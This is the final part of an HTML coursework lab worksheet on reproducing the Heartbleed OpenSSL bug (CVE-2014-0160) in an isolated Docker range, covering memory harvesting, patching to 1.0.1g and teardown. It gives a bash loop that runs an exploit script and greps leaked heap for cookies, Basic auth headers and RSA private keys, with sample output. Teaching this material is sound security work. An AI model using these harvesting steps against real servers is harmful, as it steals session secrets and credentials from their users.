+  <div class="alert alert-success"><strong>There it is.</strong> You sent an empty payload and the server handed back 16 KB of its own heap &mdash; including the <code>SESSIONSECRET</code> cookie a victim just sent. It won't appear on every single read; fire repeatedly while the victim loop runs and you'll catch it as the heap churns. This is exactly how real attackers walked server memory to pull private keys and live session cookies.</div>
+
+  <!-- ===== 04 HARVEST ===== -->
+  <div class="page-header">
+    <h2>04 &middot; Walk the heap &amp; hunt for secrets <small>Post-exploitation</small></h2>
+  </div>
+  <p>A single 16 KB read is a snapshot. The real technique is to <strong>loop</strong> &mdash; keep the victim running, collect leaks over many requests, and grep the aggregate for high-value patterns: cookie headers, HTTP Basic auth, the start of an RSA private key.</p>
+  <div class="pre-wrap">
+    <div class="pre-label">bash &mdash; attacker <button class="btn-copy">copy</button></div>
+<pre><code><span class="prompt">#</span> for i in $(seq 1 50); do python3 heartbleed.py target 4433; done &gt; bleed.log
+<span class="prompt">#</span> grep -a "SECRET\|Cookie\|Authorization\|BEGIN RSA" bleed.log
+<span class="out">0130  ... Cookie: SESSIONSECRET=the_cake_is_a_lie_42</span>
+<span class="out">02a0  ... Authorization: Basic YWxpY2U6czNjcjN0</span></code></pre>
+  </div>
+  <table class="table">
+    <tbody>
+      <tr><th>What leaks</th><td>Anything recently touched on the heap near the SSL buffers &mdash; most reliably, data sent over live connections</td></tr>
+      <tr><th>Per request</th><td>Up to 64 KB (0xFFFF); our demo claims 0x4000 = 16 KB</td></tr>
+      <tr><th>No trace</th><td>Heartbeats aren't logged by default &mdash; the original bug leaked silently for ~2 years</td></tr>
+      <tr><th>Private keys</th><td>Recoverable in practice; key material stays resident, so enough reads can surface the RSA primes</td></tr>
+    </tbody>
+  </table>
+
+  <!-- ===== 05 PATCH ===== -->
+  <div class="page-header">
+    <h2>05 &middot; Patch it and watch the bleed stop <small>Remediation &mdash; the other half of the lab</small></h2>
+  </div>
+  <p>The exercise isn't complete until you've closed it. Rebuild the exact same server against <strong>OpenSSL 1.0.1g</strong> (change one line in the Dockerfile) and run your identical exploit script.</p>
+  <div class="pre-wrap">
+    <div class="pre-label">Dockerfile &mdash; one-line change <button class="btn-copy">copy</button></div>
+<pre><code>- RUN wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz
++ RUN wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1g.tar.gz
+<span class="cmt"># (and s/1.0.1f/1.0.1g/ in the two paths below it)</span></code></pre>
+  </div>
+  <div class="pre-wrap">
+    <div class="pre-label">bash &mdash; attacker vs patched server <button class="btn-copy">copy</button></div>
+<pre><code><span class="prompt">#</span> python3 heartbleed.py target 4433
+<span class="out">[*] ServerHelloDone seen — firing heartbeat (handshake NOT completed)</span>
+<span class="good">[-] got Alert — server looks PATCHED (1.0.1g+)</span></code></pre>
+  </div>
+  <p>Same packet, same lie &mdash; but 1.0.1g runs the bounds check, sees that 0x4000 can't fit in the 3-byte record that arrived, and drops the request. The bleed is gone.</p>
+
+  <h3>5.1 &mdash; The actual fix, in the source</h3>
+  <p>In <code>ssl/t1_lib.c</code>, <code>tls1_process_heartbeat()</code> gained this guard before the <code>memcpy</code>:</p>
+  <div class="pre-wrap">
+    <div class="pre-label">t1_lib.c &mdash; the fix <button class="btn-copy">copy</button></div>
+<pre><code><span class="k">if</span> (1 + 2 + 16 &gt; s-&gt;s3-&gt;rrec.length)
+    <span class="k">return</span> 0; <span class="cmt">/* silently discard per RFC 6520 */</span>
+hbtype = *p++;
+n2s(p, payload);
+<span class="k">if</span> (1 + 2 + payload + 16 &gt; s-&gt;s3-&gt;rrec.length)
+    <span class="k">return</span> 0; <span class="cmt">/* payload must fit the record — THIS is the patch */</span></code></pre>
+  </div>
+
+  <!-- ===== 06 CLEANUP ===== -->
+  <div class="page-header">
+    <h2>06 &middot; Burn the range down <small>Teardown</small></h2>
+  </div>
+  <p>You just compiled a known-exploitable crypto library. Don't leave it lying around.</p>
+  <div class="pre-wrap">
+    <div class="pre-label">bash &mdash; host <button class="btn-copy">copy</button></div>
+<pre><code><span class="prompt">$</span> docker rm -f target
+<span class="prompt">$</span> docker rmi hb-target
+<span class="prompt">$</span> docker network rm hb-net
+<span class="cmt"># WSL: rm -rf ~/hb-lab ~/openssl-vuln and unset LD_LIBRARY_PATH</span></code></pre>
+  </div>
+  <ul class="checklist">
+    <li>Vulnerable container &amp; image removed</li>
+    <li>Isolated network torn down</li>
+    <li>Victim and attacker shells closed</li>
+    <li>Compiled <code>openssl-vuln</code> deleted; <code>LD_LIBRARY_PATH</code> no longer points at it</li>
+  </ul>
+
+  <hr>
+  <div class="footer">
+    <p><strong>Lab worksheet &middot; CVE-2014-0160.</strong> Reproduction of the TLS heartbeat buffer over-read for coursework in an isolated environment. The malformed-heartbeat technique derives from Jared Stafford's original <code>ssltest.py</code> disclosure. Keep all activity inside the sandbox you built.</p>
+    <p>References: RFC 6520 (Heartbeat Extension) &middot; the OpenSSL 1.0.1g changelog &middot; heartbleed.com for the original disclosure writeup.</p>
+  </div>
+
+</div>
+
+<script>
+  var tabs = document.querySelectorAll('[role="tab"]');
+  for (var i = 0; i < tabs.length; i++) {
+    tabs[i].addEventListener('click', function (e) {
+      for (var j = 0; j < tabs.length; j++) {
+        var sel = tabs[j] === e.currentTarget;
+        tabs[j].setAttribute('aria-selected', sel);
+        document.getElementById(tabs[j].getAttribute('aria-controls')).hidden = !sel;
+      }
+    });
+  }
+
+  var btns = document.querySelectorAll('.btn-copy');
+  for (var k = 0; k < btns.length; k++) {
+    btns[k].addEventListener('click', function (e) {
+      var btn = e.currentTarget;
+      var pre = btn.closest('.pre-wrap').querySelector('pre');
+      if (!pre) return;
+      var text = pre.innerText.replace(/^[\$#]\s/gm, '');
+      var done = function () {
+        btn.textContent = 'copied'; btn.classList.add('done');
+        setTimeout(function () { btn.textContent = 'copy'; btn.classList.remove('done'); }, 1600);
+      };
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(done, function () {
+          var r = document.createRange(); r.selectNodeContents(pre);
+          var s = getSelection(); s.removeAllRanges(); s.addRange(r);
+          btn.textContent = 'select'; btn.classList.add('done');
+        });
+      } else {
+        var r = document.createRange(); r.selectNodeContents(pre);
+        var s = getSelection(); s.removeAllRanges(); s.addRange(r);
+        btn.textContent = 'select'; btn.classList.add('done');
+      }
+    });
+  }
+</script>
+
+</body></html>
